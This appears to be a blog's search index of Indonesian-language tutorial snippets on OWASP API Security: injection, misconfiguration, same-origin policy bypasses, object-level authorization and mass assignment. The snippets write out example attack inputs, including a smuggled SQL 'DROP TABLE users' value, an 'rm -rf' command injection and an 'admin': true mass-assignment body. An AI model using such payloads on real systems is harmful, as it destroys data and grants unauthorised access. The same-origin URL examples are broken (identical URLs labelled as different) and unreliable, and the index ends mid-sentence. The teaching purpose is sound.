[ { "title": "OWASP API Security Injection", "url": "/Injection/", "categories": "Blogging, Tutorial, Injection", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Graphql API, jwt, SQL, Encode, parse, OWASP API Security, Injection", "date": "2022-02-07 00:00:00 +0700", "snippet": "OWASP API Security Injectionkamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringOWASP API Security InjectionOWASP API Security Injection adalah kerentanan yang paling memengaruhi API. Hari ini, mari kita bicara tentang OWASP API Secururity #8, Injection, jenis kerentanan yang memengaruhi sebagian besar aplikasi dan sistem API.Injection adalah masalah mendasar untuk sejumlah besar kerentanan, seperti SQL injection, OS command injection, dan XML Injection, menyumbang persentase besar kerentanan yang ditemukan di apps dan API.Bagaimana injection terjadi?Dalam satu kalimat, injection terjadi ketika aplikasi tidak dapat membedakan dengan benar antara data dan code user yang tidak dipercaya.Data user yang tidak tepercaya dapat berupa parameter request HTTP, header HTTP, dan cookie. itu juga dapat berasal dari database atau file yang disimpan yang dapat dimodifikasi oleh user. Jika aplikasi tidak memproses data user yang tidak dipercaya dengan benar sebelum memasukkannya ke dalam perintah atau query, program akan mengacaukan masukan user sebagai bagian dari perintah atau query. Dalam hal ini, penyerang dapat mengirim data ke aplikasi dengan cara yang akan mengubah arti dari perintahnya.Dalam serangan SQL Injection, misalnya, penyerang menyuntikkan data untuk memanipulasi perintah SQL. Dan dalam serangan Injection, penyerang memasukkan data yang memanipulasi logika perintah sistem OS di server hosting. Program yang menggabungkan data user dengan perintah atau code pemrograman berpotensi rentan.Kerentanan Injection juga dapat memengaruhi sistem API karena API hanyalah cara lain untuk memasukkan input user yang tidak tepercaya ke dalam aplikasi. Mari kita lihat bagaimana kerentanan Injection muncul di API.Contoh OWASP API Security Injection #1: Mengambil postingan blogKatakanlah API memungkinkan usernya untuk mengambil posting blog dengan mengirimkan request GET seperti ini:GET /api/v1.1/posts?id=1337request ini akan menyebabkan API mengembalikan posting 1337. Server akan mengambil posting blog yang sesuai dari database dengan query SQL, di mana post_id mengacu pada yang id diteruskan oleh user melalui URL.GET /api/v1.1/posts?id=12358; DROP TABLE usersServer SQL akan menafsirkan bagian id setelah titik koma sebagai perintah SQL. Jadi SQL pertama-tama akan menjalankan perintah ini untuk mengambil posting blog seperti biasa:SELECT * FROM posts WHERE post_id = 1337;Kemudian akan menjalankan perintah ini untuk menghapus TABLE USERS, menyebabkan aplikasi kehilangan data yang disimpan dalam TABLE itu.DROP TABLE usersini disebut serangan SQL Injection dan dapat terjadi setiap kali input user diteruskan ke SQL query dengan cara yang tidak aman. Perhatikan bahwa input user dalam API tidak hanya berjalan melalui parameter URL, itu juga dapat mencapai aplikasi melalui request POST, parameter URL, dan sebagainya. Jadi, penting untuk mengamankan tempat-tempat itu juga.Contoh OWASP API Security Injection #2: Membaca file sistemKatakanlah situs memungkinkan user untuk membaca file yang telah mereka upload melalui API:GET /api/v1.1/files?id=1123581321Request ini akan menyebabkan server mengambil file user melalui perintah sistem:cat /var/www/html/users/tmp/1123581321Dalam hal ini, user dapat menyuntikkan perintah baru ke dalam perintah OS sistem dengan menambahkan perintah tambahan setelah titik koma.GET /api/v1.1/files?id=1123581321; rm -rf /var/www/html/usersPerintah ini akan memaksa server untuk menghapus folder yang terletak di /var/www/html/users, yang merupakan tempat aplikasi menyimpan informasi user.rm -rf /var/www/html/usersMencegah kerentanan Injection di OWASP API Security InjectionIni adalah contoh sederhana dari kerentanan Injection. Pada kenyataannya, penting untuk diingat bahwa kerentanan injection tidak selalu sejelas ini. Dan manipulasi ini dapat terjadi kapan saja, bagian data ini sedang diproses atau digunakan. Bahkan jika data user yang berbahaya tidak langsung digunakan oleh aplikasi, data yang tidak dipercaya pada akhirnya dapat berpindah ke suatu tempat program di mana ia dapat melakukan sesuatu, seperti fungsi atau query yang tidak dilindungi. Dan di sinilah menyebabkan kerusakan pada aplikasi, datanya, atau usernya.Itu sebabnya Injection sangat sulit dicegah. Data yang tidak dipercaya dapat menyerang komponen aplikasi yang disentuhnya. Dan untuk setiap bagian data tidak dipercaya yang diterima aplikasi, ia perlu mendeteksi dan menetralisir serangan yang menargetkan setiap bagian aplikasi. Dan aplikasi mungkin berpikir sepotong data aman karena tidak mengandung karakter khusus yang digunakan untuk memicu XSS ketika penyerang bermaksud memicu SQL Injection sebagai gantinya. Tidak selalu mudah untuk menentukan data mana yang aman dan mana yang tidak, karena data yang aman dan tidak aman terlihat, sangat berbeda di berbagai aplikasi.Input validationJadi bagaimana kamu melindungi dari ancaman ini? Hal pertama yang dapat kamu lakukan adalah memvalidasi data yang tidak dipercaya. Ini berarti kamu menerapkan daftar blokir untuk menolak input yang berisi karakter yang mungkin memengaruhi komponen aplikasi. Atau kamu bisa menerapkan daftar yang diizinkan yang hanya mengizinkan string input dengan karakter yang diketahui. Misalnya, kamu menerapkan fungsi pendaftaran. Karena kamu tau bahwa data akan dimasukkan ke dalam SQL query, kamu menolak input nama user yang merupakan karakter khusus dalam SQL, seperti tanda kutip tunggal. Atau, kamu juga dapat menerapkan aturan yang hanya mengizinkan karakter alfanumerik.Namun terkadang daftar blokir sulit dilakukan karena Anda tidak selalu tahu karakter mana yang akan signifikan bagi komponen aplikasi. Jika kamu hanya melewatkan satu karakter khusus, itu dapat memungkinkan penyerang untuk melewati firewall.Dan daftar yang diizinkan mungkin terlalu membatasi dan dalam beberapa kasus, dan terkadang kamu mungkin perlu menerima karakter khusus seperti tanda kutip tunggal (&#39;) di bidang input user. Misalnya, jika user bernama OxO&#39;Enogans mendaftar, dia harus diizinkan menggunakan satu kutipan dalam namanya.ParameterisasiPertahanan lain yang mungkin melawan Injection adalah parameterisasi. Parameterisasi mengacu pada kompilasi bagian code dari suatu perintah sebelum parameter yang disediakan user dimasukkan.berarti bahwa alih-alih menggabungkan input user ke dalam perintah program dan mengirimkannya ke server untuk dikompilasi, kamu mendefinisikan semua logika terlebih dahulu, mengompilasinya, lalu memasukkan input user ke dalam perintah tepat sebelum di eksekusi.Setelah input user dimasukkan ke dalam perintah terakhir, perintah tidak akan diurai dan dikompilasi lagi. Dan yang tidak ada dalam pernyataan asli akan diperlakukan sebagai data string, dan bukan code yang dapat dieksekusi. Jadi bagian logika program dari perintah kamu akan tetap utuh.Hal ini memungkinkan database untuk membedakan antara bagian code dan bagian data dari perintah, terlepas dari seperti apa input user. Metode ini sangat efektif dalam mencegah beberapa kerentanan Injection, tetapi tidak dapat digunakan di setiap konteks dalam code.EscapingDan akhirnya, kamu dapat melarikan diri dari karakter khusus sebagai gantinya. Melarikan diri berarti kamu menyandikan karakter khusus dalam input user sehingga diperlakukan sebagai data dan bukan sebagai karakter khusus. Dengan menggunakan penanda dan syntax khusus untuk menandai karakter khusus dalam input user, pelolosan memungkinkan mengetahui bahwa data tidak dimaksudkan untuk dieksekusi.Tetapi metode ini juga memiliki masalah. Pertama, kamu harus menggunakan syntax Encode yang tepat untuk setiap parser hilir atau nilai yang disandikan disalah artikan oleh parser. kamu mungkin juga lupa untuk menghindari beberapa karakter, yang dapat digunakan penyerang untuk menetralisir upaya penyandian kamu. Jadi, kunci untuk mencegah kerentanan Injection adalah memahami cara kerja parser dari berbagai bahasa, dan parser mana yang berjalan lebih dulu dalam proses kamu." }, { "title": "OWASP API Security Misconfiguration", "url": "/security-misconfiguration/", "categories": "Blogging, Tutorial, Security Misconfiguration", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Graphql API, jwt, SQL, Encode, parse, OWASP API Security API Security, Injection, Security Misconfiguration", "date": "2022-02-05 00:00:00 +0700", "snippet": "kamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringSecurity Misconfiguration merupakan ancaman konstan terhadap API dan aplikasi non-API. mari kita bicara tentang Security Misconfiguration di API, dan bagaimana hal itu dapat memengaruhi API.OWASP API Security MisconfigurationPesan kesalahan verbosePertama-tama, salah satu Security Misconfiguration yang paling umum adalah mengirim pesan kesalahan verbose kepada user. Pesan kesalahan verbose ini mungkin berisi jejak, informasi tentang sistem, seperti versi server atau struktur database, dan memberikan wawasan kepada user tentang cara kerja aplikasi. Dalam hal ini, penyerang dapat memaksa pesan kesalahan dari aplikasi (melalui penyediaan input yang salah atau ilegal) untuk mengumpulkan informasi tentang server.Banyak halaman 404 default juga berisi tanda tangan khusus yang memungkinkan penyerang untuk menandai teknologi yang digunakan, contohnya adalah framework Ruby on Rails.Header HTTP yang salah diconfigurasiconfigurasi umum lainnya adalah penyalahgunaan atau hilangnya header HTTP. Ada banyak header keamanan HTTP yang membantu meningkatkan keamanan aplikasi. Jika tidak diconfigurasi dengan benar, penyerang sering kali dapat menemukan celah keamanan yang memungkinkan mereka mengekstrak data, atau melakukan serangan pada user aplikasi.Misalnya, header Content-Security-Policy (CSP) mengontrol resource mana yang boleh dimuat oleh browser untuk sebuah halaman. browser harus diatur untuk melarang scrip dari domain random, dan atribut HTML penanganan peristiwa untuk mencegah serangan XSS (cross site script). Untuk detail tentang cara mengconfigurasi CSP dengan aman, baca posting saya tentang topik di sini: Content Security Policy (CSP)Kesalahan configurasi CORS (Cross-Origin resource sharing) juga merupakan masalah yang berasal dari kesalahan configurasi header HTTP.Cross-origin resource sharing (CORS) adalah cara aman untuk melonggarkan same-origin policy (SOP). ini juga memungkinkan server untuk secara eksplisit menentukan daftar asal yang diizinkan untuk mengakses resourcenya melalui header Access-Control-Allow-Origin.Access-Control-Allow-Origin harus diconfigurasi untuk mengizinkan komunikasi cross-origin dari situs tepercaya. Kebijakan CORS yang salah diconfigurasi memungkinkan penyerang mencuri data rahasia dengan mengacaukan komunikasi cross-origin. Anda dapat membaca lebih lanjut tentang bagaimana penyerang dapat mengeksploitasi CORS yang salah configurasi di sini: Hacking the Same-Origin PolicyLayanan yang tidak perlu atau HTTP methodsKesalahan configurasi umum lainnya adalah gagal menutup layanan yang tidak perlu atau HTTP methods. Sebagai contoh, mari kita lihat contoh yang saya sebutkan di posting saya sebelumnya. Access control bug yang saya sebutkan disebabkan oleh tidak menutup HTTP methods yang tidak digunakan.API memungkinkan usernya untuk mengambil posting blog dengan mengirimkan request GET ke akhir seperti ini:GET /api/v1.1/user/12358/posts?id=32Request ini akan menyebabkan API mengembalikan postingan 32 dari user 12358. Karena semua postingan di platform ini bersifat publik, setiap user dapat mengirimkan request untuk mengakses postingan orang lain.Namun, karena hanya user itu sendiri yang boleh mengubah postingan blog, hanya user 12358 yang dapat mengirimkan request POST untuk mengubah atau mengedit postingan. Jika API tidak menempatkan batasan yang sama pada request yang dikirim dengan HTTP methods yang kurang populer, seperti PUT dan DELETE, pernyerang mungkin dapat mengubah atau menghapus postingan user lain dengan menggunakan HTTP methods yang berbeda.DELETE /api/v1.1/user/12358/posts?id=32saya juga berbicara tentang bagaimana situs memungkinkan admin untuk melihat statistik situs melalui API khusus:GET /api/v1.1/site/stats/hd216zlaadmin ini tidak menerapkan batasan user. Situs bergantung pada fakta bahwa URL berisi string random di akhir untuk mencegah user yang tidak sah mengaksesnya. Praktik ini disebut “Security through Obscurity”, yang berarti meningkatkan keamanan dengan menahan pengetahuan dari pihak luar.Tetapi keamanan melalui ketidak jelasan tidak dapat diandalkan sebagai satu-satunya mekanisme keamanan. Jika penyerang dapat mengetahui URL yang tidak jelas melalui kebocoran informasi, penyerang dapat mengakses fungsionalitas sensitif yang tersembunyi di balik titik akhir. Membiarkan layanan sensitif seperti ini terbuka untuk orang luar dapat menyebabkan penyerang mendapatkan akses ke sana.configurasi default tidak amanBanyak dependensi pihak ketiga seperti basis data dan web framework tidak aman secara default dan mengharuskan developer untuk memperketat keamanan melalui configurasi khusus. Misalnya, versi MongoDB yang lebih lama dapat diakses ke internet dan tidak memerlukan authentication secara default. Hal ini menyebabkan ribuan database terekspos ke publik jika developer tidak mengubah configurasi default.configurasi default yang tidak aman seperti contoh ini dapat menyebabkan banyak masalah keamanan jika developer tidak menyadari konsekuensinya.Sampai sekarang, MongoDB masih tidak memerlukan authentication secara default. Untuk melihat bagaimana kamu dapat mengatur authentication ke database MongoDB kamu, baca dokumen di sini: enable-authentication" }, { "title": "Hacking Same-Origin Policy", "url": "/same-origin-policy/", "categories": "Blogging, Tutorial, Hacking Same-Origin Policy", "tags": "Same-Origin Policy, SOP, CSS, HTML, Javascript, attacker, Cross-origin resource sharing, CORS, Cross-domain messaging, postMessage, JSON with Padding, JSONP, Attacking, XSS, Exploiting, Hacking Same-Origin Policy", "date": "2022-02-04 00:00:00 +0700", "snippet": "Same-Origin Policy adalah salah satu pertahanan dasar yang digunakan dalam situs web. ini membatasi bagaimana script dari satu asal dapat berinteraksi dengan resource dari asal yang berbeda. Sangat penting dalam mencegah sejumlah kerentanan web umum.Namun, karena SOP cukup ketat dan tidak fleksibel, sebagian besar situs web menggunakan metode SOP. Dan di sinilah sering terjadi kesalahan. Hari ini, kita akan membahas secara detail SOP, bagaimana pengaruhnya terhadap situs web, dan bagaimana attacker mengeksploitasi fitur SOP.Same-Origin PolicyApa itu Same-Origin Policy (SOP)?Dalam satu kalimat, Same-Origin Policy adalah sebagai berikut: script dari halaman A hanya dapat mengakses data dari halaman B jika berasal dari same-origin.Siapa yang memiliki same-origin?Dua URL dikatakan memiliki same-origin jika memiliki protocol, nama host, dan port yang sama. Katakanlah halaman A ada di[https://0x.3n0.us/](HTTPS pada port 443 secara default)Manakah dari halaman berikut ini yang merupakan “same-origin” menurut Same-Origin Policy?https://0x.3n0.us/ (same origin, same protocol, hostname &amp;amp; port)https://0x.3n0.us/ (different origin, because protocol differs)https://0x.3n0.us/(different origin, because hostname differs)https://0x.3n0.us/:8080/0x3n0 (different origin, because port number differs)Apa yang membatasi SOP?SOP tidak mengizinkan script dari halaman A mengakses data di halaman B jika tidak memiliki same-origin. Ini dimaksudkan untuk mencegah script berbahaya di halaman A mendapatkan informasi sensitif yang disematkan di DOM halaman B. Catatan tambahan: SOP membatasi akses data saja. resource yang disematkan seperti gambar, CSS, dan script tidak dibatasi dan dapat diakses serta dimuat di berbagai sumber.situs web sering mendasarkan authenticationnya pada cookie HTTP, dan server mengambil tindakan berdasarkan cookie yang disertakan secara otomatis oleh browser. Hal ini membuat SOP sangat penting.Bayangkan jika kamu masuk ke onlinebank.com, dan pada saat yang sama, kamu mengunjungi attacker.com di browser yang sama. Jika SOP tidak ada, script yang dihosting di attacker.com bebas mengakses informasi kamu di onlinebank.com , karena browser kamu akan secara otomatis menyertakan cookie onlinebank.com kamu di setiap permintaan yang kamu kirim ke onlinebank.com (Bahkan jika request yang berbahaya menghasilkan dari script yang dihosting di attacker.com ).attacker.com dapat melakukan sesuatu seperti ini: request GET ke onlinebank.com/personal_info menggunakan script. (Karena kamu login ke onlinebank.com, server dapat mengirim kembali halaman HTML yang berisi halaman info pribadi kamu.) Terima dan parsing halaman HTML yang dikembalikan. Ambil token CSRF, alamat email pribadi, alamat, dan informasi perbankan yang diuraikan dari halaman. Di sinilah SOP berperan: SOP akan mencegah script berbahaya yang dihosting di attacker.com untuk membaca data HTML yang dikembalikan dari onlinebank.com.Melonggarkan SOPSecara praktis, SOP seringkali terlalu membatasi untuk situs web. Misalnya, beberapa subdomain atau beberapa domain dari situs web besar yang sama tidak akan dapat berbagi informasi satu sama lain. Untuk mengatasi masalah ini, banyak cara untuk mengatasi SOP.Mengatur dokumen.domainMenyetel domain dari subdomain yang berbeda menggunakan document.domain akan memungkinkan untuk berbagi resource. Misalnya setting domain dari a.domain.com dan b.domain.com menjadi domain.com agar bisa saling berinteraksi. Catatan tambahan: Melakukan ini akan menyetel port ke nol, yang mungkin ditafsirkan secara berbeda oleh browser yang berbeda. Dalam contoh di atas, https://a.domain.com mungkin tidak dapat berinteraksi dengan https://domain.com karena portnya berbeda (Null vs 443).Cross-origin resource sharing (CORS)kamu juga dapat menggunakan Cross-Origin resource sharing (CORS) untuk melonggarkan SOP. CORS melindungi data dari server yang diminta. Ini memungkinkan server untuk secara eksplisit menentukan daftar origin yang diizinkan melalui header Access-Control-Allow-Origin. asal halaman yang mengirimkan request kemudian diperiksa dengan list origin yang diizinkan ini.Cross-domain messages (postMessage)PostMessage adalah cara untuk mengatasi SOP. Teknik ini memungkinkan halaman untuk mengirim pesan berbasis teks ke halaman lain dengan memanggil method postMessage() di jendela. Jendela penerima kemudian menangani pesan menggunakan event handler onmessageKarena menggunakan postMessage mengharuskan pengirim untuk mendapatkan objek jendela penerima, pesan hanya dapat dikirim antara jendela dan iframe atau popupnya.JSON dengan Padding (JSONP)JSONP adalah teknik lain yang bekerja di sekitar SOP. Ini juga memungkinkan pengirim untuk mengirim data JSON dalam fungsi panggilan balik yang dievaluasi sebagai JS. Kemudian script yang terletak di origin yang berbeda dapat membaca data JSON dengan memproses fungsinya.Karena tag &amp;lt;script&amp;gt; HTML diizinkan untuk memuat code JS terlepas dari asalnya, cara mudah untuk berbagi data cross origin adalah dengan membuatnya sebagai bagian dari tag &amp;lt;script&amp;gt;. JSONP membungkus data JSON dalam fungsi panggilan balik agar data ditafsirkan sebagai code JS yang valid.Misalnya, katakanlah kita mencoba meneruskan JSON berikut ke seluruh origin:// data located at https://0x.3n0.us/get_user_articles{“username”: “eno”, “num_articles”: “39”}Blok data ini tidak dapat dimuat secara langsung sebagai script karena dalam format JSON:&amp;lt;script src=”https://0x.3n0.us/get_user_articles”&amp;gt;&amp;lt;/script&amp;gt;Ini akan gagal karena JSON di atasnya bukan Javascript yang valid, dan kesalahan syntax JS akan muncul. JSONP mengatasi masalah ini dengan membungkus data dalam fungsi JS:parse({“username”: eno, “num_articles”: “39”})Halaman yang menerima data kemudian dapat mengekstrak data dari payload JSONP dengan memproses fungsinya.Masalah dengan JSONP adalah bahwa situs A harus memercayai situs B sepenuhnya karena menyertakan Javascript arbitrary dari situs B. Sekarang CORS adalah opsi, JSONP lebih jarang digunakan.Attacking SOPSelain bypass SOP yang dikendalikan dan dimaksudkan yang disebutkan di atas, ada cara yang dapat digunakan attacker untuk memanipulasi cross-source communication. Eksploitasi ini sering disebabkan oleh penerapan salah satu teknik relaxation SOP yang salah.attacker yang dapat melewati SOP dan relaxation policy yang dimaksudkan oleh developer dapat menyebabkan kebocoran informasi pribadi dan sering kali menyebabkan lebih banyak kerentanan seperti bypass authentication, pengambilalihan akun.Mari kita bicara tentang beberapa cara bagaimana attacker menggunakan teknik ini.XSSXSS pada dasarnya adalah bypass SOP lengkap karena Javascript yang berjalan di halaman A akan beroperasi di bawah konteks keamanan halaman A. berarti bahwa jika attacker dapat mengeksekusi script di halaman korban, script tersebut dapat mengakses resource halaman dan data.Memanfaatkan CORSCORS yang salah diconfigurasi adalah hal lain yang dapat dimanfaatkan attacker untuk mengacaukan cross-origin communication.Salah satu kesalahan configurasi yang dapat dieksploitasi adalah ketika situs menggunakan regex yang lemah untuk memvalidasi origin. Misalnya, jika policy hanya memeriksa apakah URL origin dimulai dengan www.site.com, policy tersebut dapat diabaikan dengan menggunakan subdomain karakter pengganti. Jika attacker memiliki domain attacker.com, dia dapat mengaktifkan entry wildcard ke domainnya sendiri, sehingga *.attacker.com akan dialihkan ke attacker.com. kemudian dapat menggunakan www.site.com.attacker.com sebagai asal request untuk melewati SOP.Kesalahan configurasi CORS umum lainnya yang dapat dieksploitasi adalah mengatur origin yang diizinkan ke NULL atau attacker.com. pada dasarnya tujuan SOP dan menghilangkan limit pada cross-source communication.configurasi menarik yang tidak dapat dieksploitasi adalah mengatur origin yang diizinkan ke wildcard *. ini juga tidak dapat dieksploitasi karena CORS tidak mengizinkan credentials dikirim dengan request, sehingga tidak ada informasi pribadi yang dapat dibocorkan.Kesalahan configurasi di CORS juga tidak dapat dieksploitasi ketika header khusus digunakan untuk authentication, atau ketika ada key random dan tidak dapat ditebak ditempatkan dalam request atau URI.Mengeksploitasi postMessageSaat menggunakan postMessage, pengirim dan penerima pesan harus memverifikasi origin dari pihak lain. Kerentanan terjadi ketika halaman melakukan pemeriksaan origin yang buruk (regex lemah, misalnya), atau sama sekali tidak memiliki pemeriksaan origin.Jika halaman pengirim tidak menerapkan targetOrigin penerima atau menggunakan wildcard targetOrigin, informasi dapat bocor ke situs lain menggunakan postMessage. (TargetOrigin dapat ditentukan dalam fungsi postMessage sebagai parameter.)Untuk mengeksploitasi masalah ini, attacker dapat membuat halaman HTML sedang listen yang berasal dari halaman yang rentan. kemudian dapat mengelabui korban untuk memicu postMessage menggunakan link atau gambar palsu dan membuat halaman korban mengirim data ke halaman attacker.Di sisi lain, jika penerima pesan tidak memvalidasi dari mana postMessage berasal, attacker dapat mengirim data sewenang-wenang ke situs web dan memicu tindakan yang tidak diinginkan atas nama korban.Untuk melakukan itu, attacker dapat menyematkan atau membuka halaman korban di halaman HTML untuk mendapatkan referensinya. Kemudian, dia bebas mengirim pesan pos. Ketika halaman HTML ini diakses oleh korban, postMessage yang akan mengirim credentials korban.Terima kasih sudah membaca." }, { "title": "OWASP API Security Broken Object Level Authorization", "url": "/object-level-authorization/", "categories": "Blogging, Tutorial, Broken Object Level Authorization", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, Broken Object Level Authorization, OWASP API Security", "date": "2022-02-03 00:00:00 +0700", "snippet": "Saat aplikasi modern menjadi lebih kompleks, mereka semakin dibangun menggunakan API. Terlebih lagi, API memiliki kemampuan untuk melakukan tindakan penting atau mengomunikasikan informasi sensitif. Ini menjadikan bug API sebagai sumber keamanan dan kebocoran data yang tersebar luas. Itu berarti ada baiknya memahami API, kerentanan yang termanifestasi di dalamnya, dan cara bertahan dari kerentanan ini.OWASP API Security Broken Object Level AuthorizationKamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam aplikasi web. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. API teratas saat ini adalah Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Asset Management Insufficient Logging &amp;amp; Monitoring.Banyak dari kerentanan ini mempengaruhi komponen aplikasi selain API, tetapi mereka cenderung memanifestasikan dirinya dalam API. mari kita bicara tentang kerentanan OWASP API Security #1, Broken Object Level Authorization.API Security Object Level AuthorizationOWASP API Security Broken Object Level Authorization VulnerabilityAPI sering kali mengekspos pengidentifikasi objek yang digunakan untuk mengakses resource. Dan ketika akses kontrol tidak diterapkan dengan benar, penyerang dapat melihat atau mengoperasikan resource yang seharusnya tidak mereka akses. Kerentanan ini memengaruhi semua jenis arsitektur API, termasuk SOAP, REST, dan GraphQL.Mari kita lihat sebuah contoh! Katakanlah bahwa API memungkinkan user untuk mengambil detail tentang metode pembayaran mereka berdasarkan ID user mereka:https://api.contoh.com/v1.1/users/payment/show?user_id=12Di sini, jika aplikasi tidak memerlukan bukti identitas tambahan dalam API dan hanya mengembalikan data yang diminta kepada siapa pun, aplikasi akan memaparkan informasi sensitif kepada penyerang. Penyerang dapat menebak, membocorkan, atau memaksa ID korban dan mencuri informasi pembayaran mereka melalui API.Seringkali, aplikasi mengizinkan user untuk mengakses objek data berdasarkan ID objek, bukan ID user mereka. contoh.com juga memiliki API yang memungkinkan pengguna mengambil konten pesan pribadi mereka. Pesan direferensikan menggunakan ID numerik:https://api.contoh.com/v1.1/messages/show?id=1337Jika server tidak menerapkan akses kontrol, penyerang dapat memaksa ID numerik ini dan mengambil pesan user lain!kerentanan ini adalah contoh Broken Object Level Authorization.. Tidak ada pemeriksaan identitas sebelum user mengakses objek data individual. Server tidak memverifikasi apakah Anda adalah user yang sah. Itu hanya mengembalikan informasi, seperti yang Anda minta.Selain yang membaca objek data, masalah ini juga dapat memengaruhi API yang memperbarui, menghapus, atau membuat entri data. Misalnya, masalah umum dalam implementasi GraphQL adalah bahwa API mengizinkan user yang tidak sah untuk mengedit data dengan mengganti ID dalam request.Apa yang bisa salah?Dampak dari Broken Object-Level Access tergantung pada objek data yang diekspos. Jika objek penting seperti PII dan kredensial user terekspos, bug dapat menyebabkan penyalhgunaan data atau kompromi aplikasi.Kerentanan ini dapat dieksploitasi lebih dalam: penyerang dapat menulis skrip untuk menanyakan semua ID user dan mengikis data secara otomatis. Jika kerentanan ini terjadi di situs Ecommerce, penyerang mungkin dapat mengambil jutaan rekening bank, nomor kartu kredit, dan alamat. Jika kerentanan ini ditemukan di situs perbankan, penyerang dapat membocorkan informasi kredit dan formulir pajak semua orang!Bagaimana cara mencegahnya ?Cara ideal untuk mencegah masalah broken object level authorization vulnerability adalah menyimpulkan identitas user API dari akses token atau bentuk rahasia lainnya. Kemudian, terapkan akses kontrol pada semua API sensitif yang memerlukan beberapa hak akses, ingat bahwa setiap API dan metode request perlu diaudit dengan benar. Misalnya, saya sering melihat implementasi API di mana hanya mengubah ke metode request yang berbeda akan melewati kontrol.Jika tidak memungkinkan, objek data dengan nilai acak alih-alih ID numerik sederhana. Namun, hanya menggunakan ID acak tidak dapat dianggap sebagai perlindungan menyeluruh karena ID dapat bocor atau dicuri. Katakanlah API tidak dibatasi oleh akses kontrol:https://api.contoh.com/v1.1/messages/show?id= d0c240ea139206019f692dMeskipun sulit untuk menebak ID yang digunakan untuk mereferensikan pesan, penyerang mungkin dapat mencuri atau membocorkan ID. ID ini mungkin juga tersedia untuk ekstensi browser dan riwayat penjelajahan.Mencegah Object Level Authorization harus menjadi prioritas utama kamu sebagai developer. Tetapi bahkan API dengan Object Level Authorization yang tepat dapat rentan terhadap serangan. Menerapkan mekanisme otentikasi yang tepat untuk layanan API juga bisa rumit." }, { "title": "OWASP API Security Mass Assignment", "url": "/mass-assignment/", "categories": "Blogging, Tutorial, Mass Assignment", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Graphql API, jwt, Broken User Authentication, OWASP API Security, Mass Assignment", "date": "2022-02-02 00:00:00 +0700", "snippet": "API OWASP Securitykamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringKerentanan yang akan kita bicarakan adalah OWASP API Security Top 10, Mass Assignment. (Penugasan massal) mengacu pada praktik pemberian nilai ke beberapa variabel atau properti objek sekaligus. Tetapi bagaimana fitur ini dapat menyebabkan kerentanan keamanan? Mari kita mulai dengan melihat contoh objek.OWASP API Security Properti objectObjek aplikasi seringkali memiliki banyak properti yang menggambarkan objek tersebut. Misalnya, katakanlah objek user digunakan untuk menyimpan informasi user di aplikasi kamu. objek ini berisi properti yang menggambarkan user seperti ID user, name, location, dan sebagainya.{ &quot;id&quot;: 1337, &quot;name&quot;: &quot;eno&quot;, &quot;location&quot;: &quot;Blk 335 Smith Street, SG&quot;, &quot;admin&quot;: false, &quot;group_membership&quot;: [121, 322, 457] }Dalam hal ini, user harus dapat memodifikasi beberapa properti yang disimpan di objek mereka, seperti properti location dan name. Tetapi bagian lain dari objek user ini harus dibatasi dari user, seperti properti admin, yang menunjukkan apakah user adalah admin, dan properti group_membership, yang mencatat grup user mana yang menjadi anggotanya.OWASP API Security Mass AssignmentMass Assignment adalah kerentanan di mana catatan aktif dalam sebuah website disalahgunakan untuk mengubah item data yang biasanya tidak boleh diakses oleh user seperti password, permission, atau status admin.Kerentanan Mass Assignment terjadi ketika aplikasi secara otomatis memberikan input user ke beberapa variabel atau objek program. Ini adalah fitur dalam banyak framework aplikasi yang dirancang untuk menyederhanakan pengembangan aplikasi.Namun fitur ini terkadang memungkinkan penyerang untuk menimpa, memodifikasi, atau membuat variabel program atau properti objek baru sesuka hati. Misalnya, katakanlah situs mengizinkan user untuk mengubah nama mereka melalui request PUT seperti ini. request ini akan memperbarui name user 1337 dari eno menjadi enogans.Contoh OWASP API Security #1 Mass AssignmentPUT /api/v1.1/user/1337{ &quot;name&quot;: &quot;eno&quot; }Sekarang, bagaimana jika user mengirimkan request ini?PUT /api/v1.1/user/1337{ &quot;name&quot;: &quot;enogans&quot;, &quot;admin&quot;: true }Jika aplikasi menggunakan Mass Assignment untuk memperbarui properti objek user secara otomatis, request ini juga akan mengupdate bidang admin, dan memberikan hak admin kepada user 1337. Seperti inilah kerentanan Mass Assignment. Demikian pula, user mungkin dapat menambahkan sendiri ke grup user pribadi dengan menetapkan diri mereka sendiri ke grup baru.Contoh OWASP API Security #2 Mass AssignmentPUT /api/v1.1/user/1337{ &quot;name&quot;: &quot;eno&quot;, &quot;admin&quot;: true, &quot;group_membership&quot;: [1, 35, 121, 322, 457] }Cara Mencegah Mass AssignmentUntuk cara mencegah Mass Assignment, kamu dapat menonaktifkan fitur Mass Assignment dengan framework yang kamu gunakan, atau menggunakan daftar putih untuk mengizinkan pada properti atau 